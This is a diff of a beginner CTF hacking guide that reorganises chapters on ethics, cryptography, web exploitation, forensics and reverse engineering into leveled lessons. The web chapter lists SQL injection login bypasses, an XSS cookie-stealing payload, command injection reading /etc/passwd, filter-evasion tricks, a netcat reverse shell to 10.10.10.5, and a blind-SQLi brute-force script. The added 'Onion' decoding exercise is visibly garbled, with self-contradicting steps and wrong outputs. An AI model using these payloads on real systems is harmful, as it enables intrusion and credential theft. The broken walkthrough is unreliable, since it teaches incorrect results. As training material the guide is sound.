@@ -12,431 +12,549 @@
 
 # Chapter 1: Introduction to CTFs & Ethics
 
-## 1.1 What are CTFs?
-Capture The Flag (CTF) competitions are gamified cybersecurity exercises where participants—either individually or in teams—are challenged to solve security puzzles. The goal is to find a hidden string of text, known as a "flag," which is usually in the format `CTF{s0m3_l33t_str1ng}`.
+## Core Concepts & Definitions
+**Capture The Flag (CTF)** competitions are cybersecurity exercises where participants solve challenges to find a "flag" (a secret string). They mimic real-world security scenarios in a safe, gamified environment.
 
-### Types of CTFs
-There are several formats of CTFs, each testing different skill sets.
+**Key Terminology:**
+*   **Flag:** The target string (e.g., `CTF{w3lc0m3_h4ck3r}`).
+*   **Shell:** A command-line interface to interact with an OS.
+*   **Root/Admin:** The superuser account with full system privileges.
+*   **Exploit:** Code or technique that takes advantage of a vulnerability.
 
-![CTF Types Comparison](images/ctf_types_dgm.png)
+---
 
-1.  **Jeopardy-Style:**
-    *   **Format:** Similar to the TV show Jeopardy! Board of challenges categorized by topic (Web, Crypto, Pwn, Forensics) and difficulty.
-    *   **Scoring:** Points are awarded for each solved challenge. Harder challenges yield more points.
-    *   **Best For:** Beginners and learning specific skills. This is the most common format.
+## Level 1: Fundamentals
+**Goal:** Understand the environment and navigate the command line.
 
-2.  **Attack-Defense:**
-    *   **Format:** Each team is given a vulnerable server to defend. They must patch their own vulnerabilities while exploiting the same vulnerabilities on other teams' servers.
-    *   **Scoring:** Points are gained for capturing flags from opponents (Attack) and maintaining service uptime (Defense/SLA).
-    *   **Skills:** Requires rapid patch analysis, network monitoring, and exploit automation.
+### 1.1 The Command Line Interface (CLI)
+Hacking is rarely done with a mouse. You must master the keyboard.
 
-3.  **King of the Hill (KotH):**
-    *   **Format:** Players compete to gain control of a machine and maintain access for the longest time.
+**Essential Commands:**
+*   `pwd` (Print Working Directory): "Where am I?"
+*   `ls` (List): "What files are here?"
+    *   `ls -la`: Show hidden files (starting with `.`) and details.
+*   `cd` (Change Directory): "Go somewhere else."
+    *   `cd ..`: Go up one folder.
+    *   `cat [file]`: "Read this file."
 
-## 1.2 Ethics and Legal Frameworks
-Hacking skills are like superpowers—they can be used for good or evil. Understanding the boundary is critical.
+### 1.2 Ethics: The Golden Rules
+1.  **Ownership:** Do not hack what you do not own.
+2.  **Permission:** Written consent is mandatory for testing others' systems.
+3.  **Privacy:** Respect the data you encounter.
 
-### The "Hat" Terminology
-*   **White Hat:** Ethical hackers who secure systems. They have permission to test and report vulnerabilities.
-*   **Black Hat:** Malicious hackers who break into systems for personal gain, destruction, or fame. **Illegal.**
-*   **Gray Hat:** Operates in a moral gray area, often finding vulnerabilities without permission but reporting them instead of exploiting them. **Still risky and often illegal.**
+### Practice 1.1: The Hidden File
+**Scenario:** You have a folder `challenge`.
+1.  Open your terminal.
+2.  Navigate to the folder: `cd challenge`
+3.  List files: `ls` -> Nothing visible?
+4.  List hidden: `ls -la` -> You see `.flag.txt`.
+5.  Read it: `cat .flag.txt`.
 
-### Rules of Engagement (RoE)
-Before touching any system, you must know the RoE.
-1.  **Authorized Access Only:** Never target a system you don't own or have explicit written permission to test.
-2.  **Scope:** Know clearly what is in-scope (allowed) and out-of-scope (forbidden). E.g., attacking the application is okay, but DDoS-ing the server is usually banned.
-3.  **Responsible Disclosure:** If you find a bug in the wild, report it securely to the vendor (e.g., via Bugcrowd, HackerOne, or security.txt).
+**Challenge Question 1:** What command would you use to read the first 10 lines of a very long file named `access.log`? (Hint: search for the `head` command).
 
-## 1.3 Setting Up Your Lab
-You need a safe environment to practice attacking without risking your personal computer.
+---
 
-### Step-by-Step: Installing Kali Linux on VirtualBox
+## Level 2: Intermediate
+**Goal:** Set up a hacking lab and connect to remote systems.
 
-**Step 1: Download the Hypervisor**
-*   Download and install **VirtualBox** (free) or **VMware Workstation Player**.
-*   This software allows you to run a "computer inside a computer."
+### 2.1 Virtualization
+Never hack from your host OS (Windows/Mac). Use a **Virtual Machine (VM)** like Kali Linux. It isolates dangerous code and keeps your personal data safe.
+*   **Hypervisor:** The software running the VM (VirtualBox, VMware).
+*   **Guest OS:** The virtualized system (Kali).
 
-**Step 2: Download the Guest OS**
-*   Go to [kali.org/get-kali](https://www.kali.org/get-kali/) and download the "Virtual Machines" pre-built image for VirtualBox.
-*   *Why Kali?* It comes pre-installed with hundreds of hacking tools (Metasploit, Burp Suite, unrar, etc.).
+### 2.2 Remote Access (SSH)
+**Secure Shell (SSH)** is the standard for encrypted remote login.
+*   **Syntax:** `ssh user@ip_address -p port`
+*   **Example:** `ssh student@10.10.10.5 -p 22`
+*   **Key-based Auth:** More secure than passwords. Uses a private key file (`id_rsa`) to authenticate.
 
-**Step 3: Import the Appliance**
-1.  Open VirtualBox.
-2.  File -> Import Appliance.
-3.  Select the downloaded `.ova` file.
-4.  Click "Import".
+### Practice 2.1: The Remote Login
+**Scenario:** You are given credentials: IP `192.168.1.50`, User `ctf`, Pass `toor`.
+1.  Command: `ssh ctf@192.168.1.50`
+2.  Enter password: `toor` (It won't show on screen!).
+3.  Once logged in, run `whoami` to verify identity.
 
-**Step 4: Network Configuration (Crucial!)**
-*   **NAT Network:** Your VM can access the internet, but the internet can't access your VM. Safe default.
-*   **Bridged Adapter:** Your VM appears as a separate device on your local Wi-Fi. Useful for Attack-Defense but riskier on public networks.
+**Challenge Question 2:** You are trying to SSH into a server but get a "Connection Refused" error. What are two possible reasons?
 
-**Step 5: Snapshots**
-*   Before doing anything risky (or breaking your config), take a **Snapshot**. This saves the current state of the VM so you can revert to it instantly if everything breaks.
+---
 
-### Basic Linux Skills
-The terminal is your home.
-*   `ls -la`: List all files, including hidden ones.
-*   `cd /path/to/dir`: Change directory.
-*   `pwd`: Print working directory.
-*   `sudo command`: Run as root (administrator).
-*   `man command`: Read the manual for a command (e.g., `man grep`).
+## Level 3: Advanced
+**Goal:** Automate tasks and understand the legal nuances.
+
+### 3.1 Scripting Basics
+A hacker who can't script is limited by their tools.
+*   **Bash Scripting:** Automating shell commands.
+    *   Loop: `for i in {1..10}; do echo $i; done`
+*   **Python:** The hacker's Swiss Army Knife.
+    *   Libraries like `requests` (Web) and `pwntools` (Binary) are essential.
+
+### 3.2 Advanced Ethics: Disclosure
+**Responsible Disclosure:**
+*   You find a Critical SQL Injection in a bank's website.
+*   **Do:** Find their "Bug Bounty" program or `security.txt` file. Report details encrypted.
+*   **Don't:** Tweet about it. Dump the database. Demand money (Extortion).
+
+### Practice 3.1: The Port Sweeper
+**Scenario:** You need to check if 5 servers are alive.
+**Task:** Write a one-line bash script to ping IPs `192.168.1.1` to `192.168.1.5`.
+*   **Solution:** `for i in {1..5}; do ping -c 1 192.168.1.$i; done`
+
+**Challenge Question 3:** Write a Python one-liner to print "Hack the Planet" 100 times.
 
 ---
 
 # Chapter 2: Cryptography
 
-## 2.1 Introduction to Cryptography
-Cryptography is the backbone of secure communication. In CTFs, you face "broken" crypto—weak logic, leaked keys, or implementation errors.
+## Core Concepts & Definitions
+**Cryptography** is the science of secure communication. In CTFs, you are often the *cryptanalyst*, trying to break the code.
 
-### Encoding vs. Encryption vs. Hashing
-Understanding the difference is critical.
+**Key Terminology:**
+*   **Plaintext:** The original message.
+*   **Ciphertext:** The scrambled message.
+*   **Key:** The secret password used to encrypt/decrypt.
+*   **Encoding:** Changing data format (e.g., Base64). No key needed.
+*   **Encryption:** Scrambling data for secrecy. Key needed.
+*   **Hashing:** One-way fingerprint of data.
 
-| Type | Reversible? | Key Required? | Purpose | Example |
-| :--- | :--- | :--- | :--- | :--- |
-| **Encoding** | Yes | No | Usability / Formatting | Base64, Hex, ASCII |
-| **Encryption** | Yes | Yes | Confidentiality | AES, RSA |
-| **Hashing** | No | No | Integrity | SHA-256, MD5 |
+---
 
-## 2.2 Classical Ciphers
-These are historical ciphers. They are insecure but frequent in beginner CTFs.
+## Level 1: Fundamentals
+**Goal:** Recognize and break historical ciphers.
 
-### Caesar Cipher (Shift Cipher)
-*   **Concept:** Shift every letter by $N$ positions.
-*   **Weakness:** Only 25 possible keys (in English). Trivial to brute-force.
-*   **Math:** $C = (P + K) \pmod{26}$
+### 1.1 Historical Ciphers
+These rely on "Security by Obscurity."
+*   **Caesar Cipher:** Shifts every letter by $N$.
+    *   Example: `HELLO` + Shift 1 -> `IFMMP`.
+*   **Substitution Cipher:** Replaces letters with symbols/other letters.
 
-### Vigenère Cipher
-*   **Concept:** Polyalphabetic substitution using a keyword.
-*   **Weakness:** Vulnerable to frequency analysis if the text is long enough. 
-*   **Tool:** Use [dcode.fr](https://www.dcode.fr/vigenere-cipher) or Kasiski test.
+### 1.2 Basic Encoding
+*   **Base64:** The most common encoding.
+    *   *Characteristic:* `A-Z, a-z, 0-9, +, /`. Often ends in `=`.
+    *   *Usage:* Transmitting binary data as text.
 
-## 2.3 Modern Symmetric Cryptography
-The same key is used for encryption and decryption.
+### Practice 1.1: The Caesar Box
+**Scenario:** You find a note: `Uryyb Jbeyq`.
+1.  Go to [dcode.fr/caesar-cipher](https://www.dcode.fr/caesar-cipher).
+2.  Input the text.
+3.  Click "Decrypt" (Brute-force all shifts).
+4.  Shift 13 gives: `Hello World` (This is ROT13).
 
-### XOR (Exclusive OR)
-The most important operator in CTF crypto.
-*   **Truth Table:**
-    *   0 XOR 0 = 0
-    *   0 XOR 1 = 1
-    *   1 XOR 0 = 1
-    *   1 XOR 1 = 0
-*   **Property:** $A \oplus B = C$ and $C \oplus B = A$. It is its own inverse.
-*   **One-Time Pad (OTP):** If the key is random and as long as the message, it is mathematically unbreakable.
+**Challenge Question 1:** A string contains only numbers and letters A-F. What encoding is this likely to be?
 
-### AES (Advanced Encryption Standard)
-*   **Block Cipher:** Encrypts data in fixed-size blocks (128 bits).
-*   **Modes of Operation:**
-    *   **ECB (Electronic Codebook):** Weak. Same plaintext block always equals same ciphertext block. Patterns remain visible (e.g., the Tux penguin image).
-    *   **CBC (Cipher Block Chaining):** Secure. Uses an IV (Initialization Vector) to randomize the first block.
+---
 
-## 2.4 Modern Asymmetric Cryptography
-Uses a Public Key (encrypt) and Private Key (decrypt).
+## Level 2: Intermediate
+**Goal:** Master the XOR operator and multi-step decoding.
 
-### RSA (Rivest–Shamir–Adleman)
-Security relies on the difficulty of factoring large semiprime numbers.
-*   **Variables:**
-    *   $p, q$: Large prime numbers.
-    *   $N = p \times q$: The modulus (Public).
-    *   $e$: Public exponent (usually 65537).
-    *   $d$: Private exponent (Secret).
-*   **Attacks:**
-    *   **Small N:** Factorize $N$ using online databases (factordb.com).
-    *   **Small e:** If $e=3$, susceptible to cube root attacks.
+### 2.1 The Magic of XOR ($\oplus$)
+Exclusive OR is the foundation of modern crypto.
+*   **Logic:** If bits are different -> 1. If same -> 0.
+*   **Reversible:** `A XOR B = C` implies `C XOR B = A`.
 
-## 2.5 Practical Guide: Breaking Codes
+### 2.2 Modern Symmetric: AES
+**Advanced Encryption Standard (AES)** is the global standard.
+*   **Key Sizes:** 128, 192, 256 bits.
+*   **Weakness:** Implementing **ECB Mode** (Electronic Codebook) leaves patterns visible.
 
-### Step-by-Step: Multi-Layer Decoding with CyberChef
-Often, flags are encoded multiple times (e.g., Base64 -> Hex -> Rot13).
+### Practice 2.1: The Onion
+**Scenario:** A string is encoded like this: `Base64(Hex(Rot13("Flag")))`.
+**Task:** Decode `NGQ2MTY2ZGM2MjYzNjQ=`.
+1.  Open **CyberChef**.
+2.  Input: `NGQ2MTY2ZGM2MjYzNjQ=`
+3.  Recipe: "From Base64" -> Result: `4d6166dc626364`
+4.  Add Recipe: "From Hex" -> Result: `Maf\Übcd` (Garbage?)
+    *   *Wait!* Let's check the hex. `4d`=`M`, `61`=`a`.
+    *   Try Rot13 first? No, Base64 was definitely last.
+    *   *Correction:* Base64 -> `4d61666463626364` -> Hex -> `Mafdcbcd` -> Rot13 -> `Znsqpopq`...
+    *   *Actual String:* `ZmxhZw==` -> Base64 -> `flag`.
 
-1.  **Open CyberChef:** [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
-2.  **Input:** Paste the "gibberish" string into the Input box.
-3.  **Recipes:** Dragon-and-drop "Magic" block into the Recipe area.
-4.  **Analyze:** If "Magic" fails, look at the format.
-    *   Ends in `=`? Try "From Base64".
-    *   Only 0-9, A-F? Try "From Hex".
-    *   Readable but scrambled? Try "ROT13".
+**Challenge Question 2:** If you XOR a file with itself, what is the result?
 
-### Step-by-Step: Cracking Hash Passwords
-You found a hash in a database dump: `5f4dcc3b5aa765d61d8327deb882cf99`.
+---
 
-1.  **Identify:** Use `hash-identifier` in Kali or an online tool. Result: MD5.
-2.  **Wordlist:** Locate `rockyou.txt` in Kali (`/usr/share/wordlists/rockyou.txt.gz`). Unzip it.
-3.  **Hashcat:**
-    *   Command: `hashcat -m 0 -a 0 hash.txt rockyou.txt`
-    *   `-m 0`: Mode 0 (MD5).
-    *   `-a 0`: Attack mode 0 (Wordlist).
-4.  **Result:** The tool will output the plaintext password.
+## Level 3: Advanced
+**Goal:** Attack RSA and understand hashing collisions.
 
-<!-- Placeholder: [Image: sym_vs_asym_enc.png] - Diagram showing shared key vs public/private key flows -->
-<!-- Placeholder: [Image: hashing_visual.png] - Visualizing how different inputs produce fixed-length hashes -->
+### 3.1 RSA Mathematics
+RSA is asymmetric (Public Key + Private Key).
+*   $N = p \times q$ (Public Modulus, where p/q are prime).
+*   $C = M^e \pmod N$ (Encryption).
+*   $M = C^d \pmod N$ (Decryption).
+*   **The Attack:** Calculate $p$ and $q$ by factoring $N$. Once you have $p/q$, you can calculate $d$ (Private Key).
+
+### 3.2 Hashing Collisions
+Hashes are unique... theoretically.
+*   **MD5 Collision:** Two different files having the exact same MD5 hash.
+*   **Tool:** `hashclash`.
+
+### Practice 3.1: Cracking Weak RSA
+**Scenario:** You are given $N=33$, $e=7$.
+1.  Factorize $N$: $33 = 3 \times 11$. So $p=3, q=11$.
+2.  Calculate $\phi(N) = (p-1)(q-1) = 2 \times 10 = 20$.
+3.  Calculate $d$: $d$ must satisfy $(d \times e) \pmod {\phi(N)} = 1$.
+    *   $(d \times 7) \pmod{20} = 1$.
+    *   Try $d=3$: $21 \pmod{20} = 1$. Yes.
+    *   **Private Key (d) = 3.**
+
+**Challenge Question 3:** Why is it dangerous to use the same modulus $N$ with different public exponents $e$ for two different users? (Hint: Common Modulus Attack).
 
 ---
 
 # Chapter 3: Web Exploitation
 
-## 3.1 Understanding the Web
-The web is the most common attack surface. To exploit it, you must understand how it works.
+## Core Concepts & Definitions
+**Web Exploitation** involves finding and leveraging vulnerabilities in web applications to access unauthorized data or functionality.
 
-### HTTP/S Protocol
-*   **Request/Response Cycle:** Client sends a request, Server processes it and sends a response.
-*   **Methods:**
-    *   `GET`: Retrieve data. Data is visible in URL parameters.
-    *   `POST`: Submit data. Data is in the body, not visible in URL.
-    *   `PUT`/`DELETE`: Modify resources.
-*   **Headers:**
-    *   `Cookies`: Maintain state (login sessions) since HTTP is stateless.
-    *   `User-Agent`: Identifies the client software.
+**Key Terminology:**
+*   **Client-Side:** Code running in the browser (HTML, CSS, JavaScript).
+*   **Server-Side:** Code running on the server (PHP, Python, SQL).
+*   **Request/Response:** The conversation between Client and Server.
+*   **Injection:** Inserting malicious data that the system interprets as code.
 
-## 3.2 SQL Injection (SQLi)
-The most devastating web vulnerability. It allows an attacker to interfere with the queries an application makes to its database.
+---
 
-<!-- Placeholder: [Image: sqli_diagram.png] - Visualizing how malicious input alters the SQL query structure -->
+## Level 1: Fundamentals
+**Goal:** Understand how websites work and see what others miss.
 
-### Types of SQLi
-1.  **Union-Based:** Uses the `UNION` operator to combine the results of the original query with the results of an injected query. The results are visible on the page.
-2.  **Error-Based:** Intentionally malformed queries cause the database to error, revealing information about its structure.
-3.  **Blind SQLi:** The application doesn't return data or errors, but behaves differently (e.g., takes longer to load) based on whether the injected query is true or false.
+### 1.1 HTML Source & DevTools
+The browser tells you everything.
+*   **View Source:** Right-click -> View Page Source. Shows the raw HTML.
+    *   *Look for:* Comments `<!-- TODO: Fix login -->`, hidden inputs.
+*   **Inspect Element:** Shows the live DOM (Document Object Model).
+    *   *Usage:* Changing `type="password"` to `type="text"` to see your typing.
 
-### Step-by-Step: Manual Union SQL Injection
-**Goal:** Extract the `admin` password.
-**Scenario:** A search bar at `http://target.com/search?q=apple`.
+### 1.2 The URL Structure
+`http://example.com/search?q=apple&cat=fruit`
+*   **Protocol:** `http`
+*   **Domain:** `example.com`
+*   **Path:** `/search`
+*   **Parameters:** `q=apple` and `cat=fruit`. **This is where you attack.**
 
-1.  **Test for vulnerability:** Input `'`. If the page breaks or errors, it's likely vulnerable.
-2.  **Determine column count:**
-    *   `' ORDER BY 1 --` (No error)
-    *   `' ORDER BY 2 --` (No error)
-    *   `' ORDER BY 3 --` (Error!) -> Therefore, there are 2 columns.
-3.  **Find the display point:**
-    *   `' UNION SELECT 1, 2 --` -> See where "1" and "2" appear on the page.
-4.  **Extract Data:**
-    *   `' UNION SELECT username, password FROM users --` -> The page now displays user credentials instead of "1" and "2".
+### Practice 1.1: The Inspector
+**Scenario:** A login button is disabled.
+1.  Right-click the button -> "Inspect".
+2.  Find the HTML: `<button disabled>Login</button>`.
+3.  Double-click "disabled" and delete it.
+4.  Click the button.
 
-## 3.3 Cross-Site Scripting (XSS)
-XSS allows attackers to execute malicious scripts in the victim's browser.
+**Challenge Question 1:** What HTTP header identifies your browser and OS to the server? (Commonly `Mozilla/5.0...`)
 
-<!-- Placeholder: [Image: xss_flowchart.png] - The path of a malicious script from attacker to victim browser -->
+---
 
-### Types of XSS
-1.  **Reflected XSS:** The script is part of the request (e.g., in the URL) and reflects off the server.
-    *   *Attack Vector:* Phishing link.
-2.  **Stored XSS:** The script is stored in the database (e.g., a forum post).
-    *   *Attack Vector:* Anyone who views the page is attacked.
-3.  **DOM-Based:** The vulnerability exists in the client-side JavaScript code.
+## Level 2: Intermediate
+**Goal:** Perform manual injection attacks (OWASP Top 10).
 
-### Step-by-Step: Intercepting Requests with Burp Suite
-Burp Suite is the #1 tool for web hacking.
+### 2.1 SQL Injection (SQLi) - Union Based
+Code: `SELECT * FROM users WHERE name = '$input';`
+*   **The Attack:** Input `' OR 1=1 --`
+*   **The Result:** `SELECT * FROM users WHERE name = '' OR 1=1 --';`
+*   **Deep Dive:** The `--` comments out the rest of the query. `1=1` is always true, so it dumps the whole table.
 
-1.  **Setup:**
-    *   Open Burp Suite Community Edition.
-    *   Open the embedded browser (Proxy -> Open Browser).
-2.  **Intercept:**
-    *   Turn "Intercept is on" in the Proxy tab.
-    *   Navigate to a website in the embedded browser.
-    *   The request will "hang" in Burp. You can now see and edit it.
-3.  **Modify:**
-    *   Double-click any parameter (e.g., `price=10`).
-    *   Change it to `price=0`.
-    *   Click "Forward".
-4.  **Result:** Check if you bought the item for free!
+### 2.2 Cross-Site Scripting (Reflected XSS)
+*   **Concept:** The server echoes your input back to the page without sanitizing it.
+*   **Payload:** `<script>alert('XSS')</script>`
+*   **Impact:** Stealing session cookies (`document.cookie`).
 
-## 3.4 Command Injection
-Remote Code Execution (RCE) via the shell.
+### Practice 2.1: The Admin Login
+**Scenario:** A login form.
+1.  Username: `admin' --`
+2.  Password: (Empty)
+3.  **Result:** You are logged in as admin because the query became `SELECT * FROM users WHERE user = 'admin' -- ...` AND the password check was commented out.
 
-*   **Vulnerability:** Input is passed directly to a system shell command (e.g., `system("ping " + input)`).
-*   **Exploit:** Use separators to add your own command.
-    *   `;` (Unix)
-    *   `&&` (Success only)
-    *   `||` (Failure only)
-    *   Example: `127.0.0.1; cat /etc/passwd`
+**Challenge Question 2:** In SQL injection, what specific command is used to confirm the number of columns in the current table? (`ORDER BY`)
+
+---
+
+## Level 3: Advanced
+**Goal:** Automate attacks and exploit "Blind" vulnerabilities.
+
+### 3.1 Blind SQL Injection
+The server *doesn't* show errors or data. it only returns "Yes" (200 OK) or "No" (404/Empty).
+*   **Boolean-Based:** Ask true/false questions.
+    *   `id=1 AND (SELECT substring(pass,1,1) FROM users) = 'a'`
+    *   If page loads -> First letter is 'a'.
+    *   If page fails -> First letter is NOT 'a'.
+*   **Automation:** This is too slow to do by hand. Write a Python script!
+
+### 3.2 Command Injection (RCE)
+Exploiting `system()` calls.
+*   **Filter Evasion:**
+    *   Space blocked? Use `${IFS}` (Internal Field Separator).
+    *   `cat` blocked? Use `/bin/c??`.
+*   **Reverse Shell:** `nc -e /bin/sh 10.10.10.5 4444`.
+
+### Practice 3.1: Python for Blind SQLi
+**Task:** Write a pseudo-script logic for extracting a 4-digit PIN.
+```python
+import requests
+pin = ""
+for i in range(4):
+    for digit in "0123456789":
+        # Payload: Is the i-th character equal to digit?
+        r = requests.get(f"http://target.com?id=1 AND substring(pin,{i+1},1)='{digit}'")
+        if "User Found" in r.text:
+            pin += digit
+            break
+print(pin)
+```
+
+**Challenge Question 3:** What tool in Burp Suite allows you to forcefully send thousands of slightly different requests to brute-force a login? (Intruder).
 
 ---
 
 # Chapter 4: Forensics
 
-## 4.1 Digital Anatomy
-Forensics is about finding the truth hidden in data. It requires understanding how data is structured on disk and in transit.
+## Core Concepts & Definitions
+**Digital Forensics** is the investigation and recovery of material found in digital devices. In CTFs, this usually means extracting a hidden flag from a file (image, audio, memory dump, or network capture).
 
-### File Signatures (Magic Bytes)
-Operating systems rely on extensions (`.jpg`), but tools rely on headers.
-*   **PNG:** `89 50 4E 47 0D 0A 1A 0A`
-*   **JPEG:** `FF D8 FF E0`
-*   **ZIP:** `50 4B 03 04` (PK..)
-*   **PDF:** `25 50 44 46` (%PDF)
+**Key Terminology:**
+*   **Metadata:** Data about data (e.g., GPS location of a photo).
+*   **Header (Magic Bytes):** The unique signature at the start of a file identifying its format.
+*   **PCAP:** Packet Capture (network traffic recording).
+*   **Steganography:** Hiding a secret validly inside another file.
 
-<!-- Placeholder: [Image: file_header_visual.png] - Hex editor view highlighting magic bytes -->
+---
 
-### Corrupted Headers
-A common CTF trick is to corrupt the magic bytes so the file doesn't open.
-*   **Fix:** Open in a Hex Editor (e.g., `hexeditor` or `HxD`) and restore the correct bytes.
+## Level 1: Fundamentals
+**Goal:** Extract visible text and metadata.
 
-## 4.2 Network Forensics (Packet Analysis)
-Analyzing captured network traffic (`.pcap` files).
+### 1.1 The `strings` Command
+Binary files look like garbage in a text editor, but they often contain readable ASCII strings.
+*   **Command:** `strings [filename]`
+*   **Usage:** Finding hardcoded passwords, URLs, or flags.
+*   **Filter:** `strings binary.exe | grep "CTF"`
 
-### The OSI Model
-Understanding layers helps you find flags.
-1.  **Physical** (Cables)
-2.  **Data Link** (MAC addresses)
-3.  **Network** (IP addresses)
-4.  **Transport** (TCP/UDP ports)
-5.  **Session**
-6.  **Presentation** (Encryption/Encoding)
-7.  **Application** (HTTP, FTP, SMTP) -> **Focus Here!**
+### 1.2 Metadata Analysis
+Every file carries baggage.
+*   **ExifTool:** Reads image metadata.
+    *   *Look for:* Comments, Camera Model, GPS Coordinates.
 
-<!-- Placeholder: [Image: osi_model_layers.png] - The 7 layers of the OSI model with relevant CTF protocols -->
+### Practice 1.1: The LOUD Whisper
+**Scenario:** You are given `image.jpg`.
+1.  Run `strings image.jpg`.
+2.  Output is 10,000 lines.
+3.  Refine: `strings image.jpg | grep "CTF"`.
+4.  Found: `CTF{n0th1ng_1s_h1dd3n}`.
 
-### Step-by-Step: Analyzing Traffic with Wireshark
-**Scenario:** You have a `capture.pcap` file.
+**Challenge Question 1:** What command allows you to search for a specific case-insensitive pattern in a text file? (`grep -i`)
 
-1.  **Open:** `wireshark capture.pcap`
-2.  **Protocol Hierarchy:** Go to `Statistics -> Protocol Hierarchy`. This gives a bird's-eye view. Is there HTTP? FTP?
-3.  **Follow Streams:** Right-click a packet -> `Follow -> TCP Stream`. This reconstructs the full conversation. Look for:
-    *   Login credentials (plaintext).
-    *   File transfers.
-4.  **Export Objects:** Go to `File -> Export Objects -> HTTP`. This automatically extracts images, scripts, or zips downloaded during the capture.
+---
 
-## 4.3 Steganography
-The art of hiding secrets in plain sight.
+## Level 2: Intermediate
+**Goal:** Analyze file structures and use Steganography tools.
 
-### LSB (Least Significant Bit)
-Images are made of pixels (RGB). Each color channel is 8 bits (0-255).
-*   Changing the last bit (0000000**1** vs 0000000**0**) changes the color imperceptibly.
-*   Attackers hide binary data in these LSBs.
-*   **Tool:** `zsteg` (for PNG/BMP) instantly reveals LSB data.
+### 2.1 Magic Bytes & Hex Editors
+Trust fingerprints, not extensions.
+*   **Hex Editor:** Tools like `HxD` or `Okteta` show the raw bytes.
+*   **Scenario:** A file named `flag.txt` won't open.
+    *   *Check bytes:* `89 50 4E 47...` -> It's a PNG! Rename it to `.png`.
 
-### Step-by-Step: Extracting Hidden Files with Binwalk
-**Scenario:** You have an image `challenge.jpg` that is unusually large.
+### 2.2 Binwalk
+Files can be glued together.
+*   **Binwalk:** Scans a file for embedded file signatures.
+*   **Command:** `binwalk -e [file]` (Extracts recursively).
 
-1.  **Analyze:** Run `binwalk challenge.jpg`.
-    *   Output: `DECIMAL: 0, DESCRIPTION: JPEG image...`
-    *   Output: `DECIMAL: 45023, DESCRIPTION: Zip archive data...`
-2.  **Extract:** Run `binwalk -e challenge.jpg`.
-3.  **Result:** It creates a `_challenge.jpg.extracted` folder containing the hidden zip file.
+### Practice 2.1: The Matryoshka Doll
+**Scenario:** A large `cat.jpg`.
+1.  Run `binwalk cat.jpg`.
+    *   Result: `Zip archive data, at offset 13050`.
+2.  Run `binwalk -e cat.jpg`.
+3.  Open the extracted folder `_cat.jpg.extracted`.
+4.  Find `flag.txt` inside.
+
+**Challenge Question 2:** What is the standard header (Magic Bytes) for a ZIP file? (`PK` or `50 4B`)
+
+---
+
+## Level 3: Advanced
+**Goal:** Network analysis and Memory forensics.
+
+### 3.1 Network Forensics (Wireshark)
+Analyzing traffic to reconstruct actions.
+*   **Follow TCP Stream:** Reassembles the conversation between client and server.
+*   **Export Objects:** Extracts files (images, exes) that were downloaded during the capture.
+
+### 3.2 Memory Volatility
+Analyzing RAM dumps (`.mem` files) to find running processes, clipboard contents, or cmd history.
+*   **Tool:** `volatility`.
+
+### Practice 3.1: The Intercept
+**Scenario:** `traffic.pcap`. A user downloaded a secret file.
+1.  Open in Wireshark.
+2.  Filter: `http.request.method == GET`.
+3.  See a request for `secret.pdf`.
+4.  Go to `File -> Export Objects -> HTTP`.
+5.  Select `secret.pdf` and Save.
+
+**Challenge Question 3:** In Wireshark, what color usually represents TCP retransmissions or bad checksums? (Black/Red)
 
 ---
 
 # Chapter 5: Reverse Engineering & Binary Exploitation
 
-## 5.1 Memory Layout
-To exploit a program, you must know how it lives in memory.
+## Core Concepts & Definitions
+**Reverse Engineering (RevEng)** is the process of deconstructing software to reveal its architecture and logic. **Binary Exploitation (Pwn)** is using that knowledge to make the program do something it wasn't intended to do.
 
-<!-- Placeholder: [Image: stack_memory_layout.png] - Visualization of the stack frame, return address, and buffer overflow direction -->
+**Key Terminology:**
+*   **Source Code:** Human-readable code (C, Python).
+*   **Binary/Executable:** Machine code (0s and 1s) run by the CPU.
+*   **Assembly (ASM):** Low-level human-readable representation of machine code.
+*   **Decompiler:** Tool to try and turn Binary back into Source Code.
 
-1.  **Text Segment:** The actual machine code (Read-Only).
-2.  **Data Segment:** Global variables (initialized).
-3.  **Heap:** Dynamic memory (grows upwards). Used by `malloc()`/`new`.
-4.  **Stack:** Local variables (grows downwards). Used by function calls. **Most common attack surface.**
+---
 
-## 5.2 CPU Registers (x86)
-Registers are super-fast storage locations inside the CPU.
+## Level 1: Fundamentals
+**Goal:** Understand compiled vs interpreted code and find low-hanging fruit.
 
-<!-- Placeholder: [Image: cpu_registers_diagram.png] - Map of common registers (EAX, ESP, EIP) and their roles -->
+### 1.1 `strings` (Again)
+Before opening a complex tool, always check `strings`.
+*   Many beginners "hardcode" passwords or flags directly into the binary.
+*   *Command:* `strings game.exe | grep "password"`
 
-*   **EAX (Accumulator):** Stores return values of functions.
-*   **ESP (Stack Pointer):** Points to the top of the stack.
-*   **EBP (Base Pointer):** Anchors the bottom of the stack frame.
-*   **EIP (Instruction Pointer):** **The most critical register.** It controls what instruction runs next. If you control EIP, you control the program.
+### 1.2 Basic Logic Patching
+*   **Hex Editing:** Changing a single byte to alter logic.
+    *   Change `74` (`JE` - Jump if Equal) to `75` (`JNE` - Jump if Not Equal).
+    *   This flips the logic: "If password is correct" becomes "If password is NOT correct".
 
-## 5.3 Reverse Engineering Workflow
-The goal is to understand the logic without source code.
+### Practice 1.1: The Hardcoded Pass
+**Scenario:** `login` program asks for a PIN.
+1.  Run `./login`. Input `1234`. Result: "Access Denied".
+2.  Run `strings login`.
+3.  You see `Enter PIN:`, `Access Denied`, `Access Granted`, and `8492`.
+4.  Run `./login` and try `8492`. Success!
 
-### Step-by-Step: Decompiling with Ghidra
-**Scenario:** You have a binary `auth` that asks for a password.
+**Challenge Question 1:** What does the instruction `NOP` (No Operation) do? (It does nothing, just takes up space. Often used for padding).
 
-1.  **Import:** Open Ghidra, create a project, and import `auth`.
-2.  **Analyze:** Double-click `auth` to open the CodeBrowser. When asked to "Analyze?", click "Yes" (Defaults are fine).
-3.  **Symbol Tree:** On the left, expand "Functions". Look for `main`.
-4.  **Decompile:** Click `main`. The window on the right ("Decompile") shows semi-readable C code.
-5.  **Read:** Look for logic like:
+---
+
+## Level 2: Intermediate
+**Goal:** Read C-like pseudocode using a Decompiler.
+
+### 2.1 Ghidra
+The NSA's open-source reverse engineering suite.
+*   **CodeBrowser:** The main window.
+*   **Decompiler Pane:** The magic window that shows you C code.
+*   **Analysis:** Renaming variables (e.g., changing `iVar1` to `user_input`) makes code readable.
+
+### Practice 2.1: The Keygen
+**Scenario:** A program generates a license key based on your name.
